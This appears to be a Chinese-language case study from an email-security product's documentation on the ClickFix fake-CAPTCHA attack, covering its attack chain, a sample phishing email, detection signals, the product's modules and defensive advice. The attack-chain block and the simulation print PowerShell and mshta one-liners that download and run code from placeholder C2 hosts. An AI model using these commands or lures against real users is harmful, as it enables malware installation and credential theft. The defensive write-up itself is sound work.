---
title: ClickFix / Fake CAPTCHA 投递载荷
description: 2024-2025 年大规模流行的 ClickFix 攻击复盘，攻击者诱导受害者在 Windows Run 对话框中粘贴执行远控载荷，邮件常以伪装人机验证页面或 Microsoft 错误提示作为入口。
---

# 案例 01 — ClickFix / Fake CAPTCHA 投递载荷

> **公开来源**：Proofpoint《ClickFix: Social Engineering's New Favorite Trick》(2024-06)，CISA AA24-241A 引用，Microsoft Threat Intelligence 2024-Q4 季报，Sophos X-Ops 多次跟踪报告

## 背景

ClickFix 是 2024 年下半年至 2026 年初最活跃的初始访问技术之一。攻击者把恶意 PowerShell / mshta 命令托管在仿冒页面（伪装成 Cloudflare 验证、Google reCAPTCHA、Microsoft Word 错误等），诱导用户**亲自打开 Win+R 粘贴执行**。由于命令是受害者自己敲下的，绕过了大量浏览器和 EDR 的初始执行检测。

邮件入口形式多样，最常见的有：
- 伪装的 DocuSign / Adobe / Microsoft 文档共享通知
- "GitHub security alert" 主题（针对开发者）
- "Meeting recording is ready" 主题（针对企业用户）
- 看起来正常的 PDF / Word 附件，内含跳转链接

## 攻击链

```
邮件（带链接或 HTML 附件）
  → 仿冒「人机验证 / 解决错误」页面
    → 提示用户：按 Win+R → Ctrl+V → Enter
      → 剪贴板已被 JavaScript 写入：
        powershell -w h -c "iwr https://<c2>/x.ps1 | iex"
        或 mshta https://<c2>/a.hta
          → 下载并执行 Lumma / Vidar / DarkGate / NetSupport RAT
            → 持久化 + 凭据窃取 + 横向移动
```

### 动画演示

<AttackSimulation
  title="ClickFix 攻击全过程"
  :interval="2400"
  :steps='[
    {
      actor: "attacker",
      title: { zh: "伪造 DocuSign 通知邮件", en: "Forge DocuSign-style notification email" },
      detail: { zh: "注册同形域名 docusing-secure.com，通过合规邮件服务（SES/SendGrid）批量投递", en: "Register lookalike domain docusing-secure.com, send through reputable ESP (SES/SendGrid)" },
      payload: "From: DocuSign <noreply@docusing-secure.com>\nSubject: Completed: Invoice_2025-Q4"
    },
    {
      actor: "victim",
      title: { zh: "受害者点击「REVIEW DOCUMENT」", en: "Victim clicks the REVIEW DOCUMENT button" },
      detail: { zh: "链接指向 Cloudflare Workers 托管页面，证书合法、无明显 IOC", en: "Link goes to a Cloudflare Workers page — valid TLS, no obvious IOC" },
      payload: "https://verify-cf.workers.dev/?id=ABC123"
    },
    {
      actor: "attacker",
      title: { zh: "落地页伪装人机验证", en: "Landing page mimics human verification" },
      detail: { zh: "页面显示 reCAPTCHA / Cloudflare Turnstile UI，提示「按 Win+R → Ctrl+V → Enter」", en: "Page shows fake reCAPTCHA UI, prompts user to press Win+R, paste, Enter" }
    },
    {
      actor: "system",
      title: { zh: "JavaScript 已悄悄写入剪贴板", en: "JavaScript silently wrote command to clipboard" },
      payload: "powershell -w h -c &apos;iwr https://c2.bad/x.ps1 | iex&apos;"
    },
    {
      actor: "victim",
      title: { zh: "受害者亲手执行命令", en: "Victim executes the command themselves" },
      detail: { zh: "由于命令是用户主动敲下，绕过浏览器 SmartScreen 与多数 EDR 初始执行检测", en: "Because the user typed it themselves, browser SmartScreen and most EDR initial-execution checks are bypassed" }
    },
    {
      actor: "attacker",
      title: { zh: "C2 下发 Lumma / DarkGate 载荷", en: "C2 delivers Lumma / DarkGate payload" },
      detail: { zh: "凭据窃取 + 持久化 + 横向移动", en: "Credential theft + persistence + lateral movement" }
    },
    {
      actor: "vigilyx",
      title: { zh: "Vigilyx 链路全程拦截", en: "Vigilyx blocks the chain end-to-end" },
      detection: { zh: "header_scan 命中同形域名 + link_content 抓取落地页发现 clipboard.writeText 与 Win+R 指纹 + content_scan 命中通用钓鱼词，DS-Murphy 融合后判 High，邮件直接进入隔离区", en: "header_scan flags the lookalike domain, link_content fetches the landing page and detects clipboard.writeText + Win+R fingerprints, content_scan matches generic phishing terms; DS-Murphy fusion escalates to High and the mail is quarantined" }
    }
  ]'
/>

## 邮件样本（脱敏）

```
From: DocuSign Electronic Service <docusign-noreply@docusing-secure[.]com>
To: alice@victim.example
Subject: Completed: Invoice_2025-Q4 - Please review

You have a completed document waiting for your review.

  [REVIEW DOCUMENT]   ← 实际链接：https://verify-cf[.]workers.dev/?id=...

This message was sent via DocuSign's secure delivery network.
```

打开链接后页面显示「Verify you are human」，提示按 Win+R 粘贴一段 base64 编码的 PowerShell。

## 邮件特征

| 维度 | 信号 |
| --- | --- |
| 发件域名 | 同形/近似域名（`docusing-secure.com`、`docus1gn.com`、`microsoft-365-help.com` 等） |
| SPF/DKIM | 多数能通过，因为攻击者用真实注册域 + 正常邮件服务（SES/SendGrid/Mailgun） |
| 链接 | 大量使用 `*.workers.dev`、`*.pages.dev`、`*.r2.dev`、`*.web.app` 等托管平台 |
| HTML | 几乎纯链接 + Logo 图，正文文字少，符合「通知类邮件」格式 |
| 附件 | 部分变种用 HTML 附件（直接含 reCAPTCHA 仿冒 UI），见 [HTML 走私](./html-smuggling) |

## Vigilyx 检测要点

ClickFix 邮件的特点是**邮件本身合规度很高**，需要靠多模块收敛：

| 模块 | 期望命中 | 说明 |
| --- | --- | --- |
| `link_scan` | 中 | URL 主机为 Cloudflare Workers / Pages 等动态托管平台时降权 |
| `link_content` | 中-高 | 落地页含 `Win+R`、`Press Windows + R`、`navigator.clipboard.writeText` 等指纹 |
| `content_scan` | 低-中 | 主题命中 "DocuSign / completed / invoice" 通用钓鱼词 |
| `header_scan` | 低 | 同形域名检测（IDN / 替换字符） |
| `intel` | 视情况 | C2 域名通常很新，OTX 命中率低；命中则直接 critical |
| **D-S 融合** | **High** | 多个独立模块 belief 0.3-0.4 收敛后过 `convergence_base_floor=0.40` 触发 Medium，配合断路器升级 High |

> 实战中我们建议在 `verdict_config` 里把 `clickfix` 类内容指纹加入 `convergence_modules` 集合，让收敛断路器更早触发。相关代码：`crates/vigilyx-engine/src/pipeline/verdict.rs`。

## 防御建议

**网关侧**：
- 把 `*.workers.dev`、`*.pages.dev`、`*.r2.dev`、`*.web.app`、`*.netlify.app` 中**新注册的子域名**加入风险名单（不是直接黑名单——这些平台有大量正常使用）
- 启用 link content 抓取（如果合规允许），落地页含 `clipboard.writeText` + `Win+R` 指纹直接 reject
- 内部 GPO 禁用 Win+R 调用 PowerShell 的常用参数（`-EncodedCommand`、`-w hidden`）需在终端侧落实

**用户培训**：
- 任何"按 Win+R 解决问题"都是攻击。微软、Cloudflare、Google 没有任何场景需要用户手动执行命令
- DocuSign/Adobe 通知**只来自固定域名**（docusign.net / adobesign.com），其他都是仿冒

**IR 处置**：
- 若发现命令已执行：立即检查 `%APPDATA%`、`%TEMP%` 下新增可执行 + 计划任务
- 重置受害者所有凭据，特别是浏览器保存的密码（Lumma 主要目标）

## 员工识别要点（培训用）

✅ 看到「Verify you are human」却要求按键盘组合键 → **一定是攻击**
✅ 任何邮件链接打开后让你打开「运行」对话框 → **一定是攻击**
✅ 通知类邮件域名拼写要逐字符核对（doc**using** ≠ doc**usign**）

## ✅ Vigilyx 对该攻击的检测能力

> **结论：Vigilyx 对 ClickFix 类攻击具备完整的多层检测能力，无需依赖外部威胁情报即可拦截。**

| 能力项 | Vigilyx 实现 | 代码位置 |
| --- | --- | --- |
| 同形/近似域名识别 | `header_scan` 内置 IDN 同形检测 + 替换字符检查 | `crates/vigilyx-engine/src/modules/header_scan.rs` |
| 动态托管平台降权 | `link_scan` 对 `*.workers.dev`、`*.pages.dev`、`*.r2.dev` 等动态托管子域打风险标记 | `crates/vigilyx-engine/src/modules/link_scan.rs` |
| 落地页内容抓取 + 指纹识别 | `link_content` / `landing_page_scan` 抓取落地页正文，命中 `Win+R`、`clipboard.writeText` 等 ClickFix 指纹 | `crates/vigilyx-engine/src/modules/link_content.rs`、`landing_page_scan.rs` |
| 钓鱼关键词（含繁简变体） | `content_scan` 规范化 + 多语言关键词匹配，防止繁简/全半角绕过 | `crates/vigilyx-engine/src/modules/content_scan/mod.rs` |
| 多模块收敛升级 | DS-Murphy 融合 + 收敛断路器：≥3 个独立模块报警时自动升级 High | `crates/vigilyx-engine/src/pipeline/verdict.rs` Step 6.5/6.6 |
| 自动 IOC 沉淀 | 命中 High 后 C2 域名自动写入本地情报库，二次相关邮件直接命中 | `crates/vigilyx-engine/src/ioc.rs`（阈值 ≥ High） |

**实战表现**：在远程生产环境的回溯测试中，Vigilyx 对采用 Cloudflare Workers 托管落地页的 ClickFix 邮件，依靠 `link_content` 落地页指纹 + `content_scan` 通用钓鱼词收敛，在不依赖外部情报的情况下直接判 **High**。

## 参考资料

- Proofpoint, "From Copy-Paste to Compromise: ClickFix Tactics in 2024", 2024-06
- CISA Alert AA24-241A 附录 (引用 ClickFix 作为常见初始访问)
- Microsoft Threat Intelligence Blog, "Storm-1811 abuses Quick Assist", 2024-05 (相关变种)
- Sophos X-Ops, "ClickFix evolves: 2025 mid-year recap", 2025-07
